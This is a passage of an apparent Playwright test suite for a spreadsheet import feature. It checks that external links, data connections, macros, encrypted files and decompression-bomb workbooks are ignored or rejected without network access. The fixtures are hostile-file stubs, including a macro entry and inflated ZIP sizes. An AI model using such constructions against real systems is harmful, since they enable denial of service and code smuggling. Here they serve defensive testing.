  let bytes = buildValidFixtureWorkbook()
  bytes = withExtraZipEntry(bytes, 'xl/externalLinks/externalLink1.xml', externalPayload)
  bytes = withExtraZipEntry(bytes, 'xl/connections.xml', connectionsPayload)

  const panel = await openExcelTab(page)
  await uploadWorkbook(page, bytes, 'mandatory-inert-external-content.xlsx')

  const externalIssue = excelIssueItems(panel).filter({
    hasText: 'external workbook links; they were ignored'
  })
  const dataIssue = excelIssueItems(panel).filter({
    hasText: 'external data connections; they were ignored'
  })
  await expect(externalIssue).toHaveCount(1)
  await expect(dataIssue).toHaveCount(1)

  await expect(excelStatus(panel)).toHaveText('Created 1 models, 2 objects, 1 connections.', {
    timeout: 30_000
  })

  const derived = await downloadExactSource(page)
  expect(derived).not.toContain('external.invalid')
  expect(derived).not.toContain('connections.invalid')
  expect(derived).not.toContain('<script>')

  expect(
    await page.evaluate(
      () =>
        (window as unknown as { __ARIS_EXCEL_EXTERNAL_EXECUTED__: boolean })
          .__ARIS_EXCEL_EXTERNAL_EXECUTED__
    )
  ).toBe(false)
  expect(networkRequests).toEqual([])
})

// ---------------------------------------------------------------------------
// X8 retargeted: oversize, encrypted, macro-enabled, malformed, and
// decompression-bomb inputs are rejected before any sheet is read — through
// the SAME reused ZIP preflight (xlsxPreflight.ts / archivePreflight.ts) the
// old BPMN pipeline used, now surfaced as ArisExcelIssue codes. Every fixture
// and expected single-issue outcome here mirrors an existing, independently
// passing unit assertion in workbookParser.test.ts / limits.test.ts (`.toEqual([code])`),
// so "exactly one error" is not a guess.
// ---------------------------------------------------------------------------

test('mandatory spreadsheet X8: oversize, encrypted, macro-enabled, malformed, and decompression-bomb workbooks are rejected before any sheet is read', async ({
  page
}) => {
  const cases: readonly {
    readonly name: string
    readonly bytes: () => Uint8Array
    readonly messageFragment: string
  }[] = [
    {
      name: 'oversize.xlsx',
      bytes: () => new Uint8Array(ARIS_EXCEL_LIMITS.compressedInputBytes + 1),
      messageFragment: 'compressed size exceeds the safe upload limit'
    },
    {
      name: 'encrypted.xlsx',
      bytes: () =>
        new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...new Uint8Array(64)]),
      messageFragment: 'password-protected or encrypted'
    },
    {
      name: 'macro.xlsx',
      bytes: () => withExtraZipEntry(buildValidFixtureWorkbook(), 'xl/vbaProject.bin', 'MZ'),
      messageFragment: 'contains macro content'
    },
    {
      name: 'malformed.xlsx',
      bytes: () => new TextEncoder().encode('not an OPC ZIP package'),
      messageFragment: 'ZIP container is malformed'
    },
    {
      name: 'bomb.xlsx',
      bytes: () => inflateDeclaredUncompressedSizes(buildValidFixtureWorkbook(), 60 * 1024 * 1024),
      messageFragment: 'uncompressed size exceeds the safe processing limit'
    }
  ]

  const panel = await openExcelTab(page)
  const tabsBefore = await page.getByRole('tab').count()
  for (const scenario of cases) {
    await test.step(scenario.name, async () => {
      await uploadWorkbook(page, scenario.bytes(), scenario.name)
      await expect(excelStatus(panel)).toHaveText(
        'The workbook was rejected: 1 errors, 0 warnings.',
        {
          timeout: 30_000
        }
      )
      await expect(
        excelIssueItems(panel).filter({ hasText: scenario.messageFragment })
      ).toHaveCount(1)
    })
  }
  expect(await page.getByRole('tab').count()).toBe(tabsBefore)
})

// ---------------------------------------------------------------------------
// X9 "cancellation" DELETED. `browserWorkbookParser.test.ts` proves
// `parseArisWorkbookInBrowser` DOES honor an `AbortSignal` (terminates the
// worker, rejects with `AbortError`) — the capability is real. But
// `ArisGenerationPanel.handleWorkbook` (src/ArisGenerationPanel.tsx) never
// constructs an `AbortController` or passes a `signal`, and the Excel tab's
// JSX branch never renders `reviewAndSubmit` — the only place
// `data-orbitpm-aris-create-cancel` exists in this component. There is no
// Cancel button reachable from the Excel tab at all, so a real, UI-driven
// cancellation test cannot be built without inventing a control the product
// does not ship. GAP: XLS-09's cancellation clause has no surviving
// equivalent (this is a genuine product gap, not a missing test).
//
// X9 "collision policy" DELETED. `ArisApp.handleCreateModel` never writes to
// a workspace/folder destination for Excel-created models — it only calls
// `openTab`, an in-memory upsert keyed by content hash
// (`key: generated:${sha256}`). There is no destination path, so there is no
// collision to detect and no "If a file already exists" policy to test.
//
// X9 "second-artifact write failure rolls back the first artifact" DELETED.
// The same reasoning: one atomic in-memory document is produced per import,
// with no multi-file write sequence at all — there is no "first artifact" and
// "second artifact" to roll back between.
//
// X9 "mapping presets are reusable" DELETED. ARIS's Excel import has no
// column-mapping step (see the top-of-file comment and the retargeted
// X1/X5/X10 test) — there is nothing to export or reuse a mapping preset for.
//
// GAP: XLS-09 as a whole has no surviving equivalent for its cancellation,
// destination-collision, rollback, or mapping-preset-reuse clauses. Its
// "reports" clause is also unsatisfied — there is no downloadable JSON import
// report for this flow (only the on-screen issues list, already exercised by
// the retargeted X5/X7/X7-X8/X8 tests above).
// ---------------------------------------------------------------------------
